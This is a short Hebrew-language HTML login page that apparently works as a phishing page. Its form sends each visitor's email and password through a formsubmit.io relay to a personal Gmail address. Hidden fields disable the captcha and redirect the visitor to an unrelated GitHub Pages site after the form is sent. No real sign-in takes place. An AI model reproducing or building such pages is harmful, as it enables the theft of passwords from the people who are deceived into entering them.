<!DOCTYPE html>
<html lang="he">
<head>
  <meta charset="UTF-8">
  <title>התחברות</title>
  <style>
    body {
      font-family: Arial;
      direction: rtl;
      text-align: center;
      margin-top: 100px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      width: 250px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      background-color: red;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: darkred;
    }
  </style>
</head>
<body>
  <h2>התחברות</h2>
  <form action="https://formsubmit.io/send/itaitushbox@gmail.com" method="POST">
    <input type="email" name="email" placeholder="אימייל" required><br>
    <input type="password" name="password" placeholder="סיסמה" required><br>
    
    <!-- זה עושה הפנייה אחרי השליחה -->
    <input type="hidden" name="_redirect" value="https://itapita470.github.io/itapitascompare.com/">
    
    <!-- מבטל captcha והודעות מיותרות -->
    <input type="hidden" name="_captcha" value="false">
    
    <button type="submit">התחבר</button>
  </form>
</body>
</html>
